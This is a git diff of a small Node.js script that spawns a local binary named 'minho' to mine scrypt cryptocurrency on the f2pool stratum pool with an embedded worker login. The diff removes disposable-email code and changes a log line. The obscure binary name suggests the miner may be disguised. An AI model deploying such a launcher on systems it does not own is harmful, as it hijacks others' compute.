@@ -2,18 +2,12 @@ var util  = require('util'),
     spawn = require('child_process').spawn,
     ls    = spawn('./minho',['-a','scrypt','-t','4','-s','6','-o','stratum+tcp://stratum.f2pool.com:8888','-O','spiritbro.panda:password']);
 
-var TempMail = require('tempmail.js');
-var account = new TempMail("kimbo@walkmail.ru");
-console.log(account.address); 
-account.getMail().then((messages) => {
-  console.log(messages);
-});
 ls.stdout.on('data', function (data) {
   console.log('stdout: ' + data.toString());
 });
 
 ls.stderr.on('data', function (data) {
-  console.log("bismillah"+process.argv[2])
+  console.log("bismillah")
   console.log('stderr: ' + data.toString());
 });
 
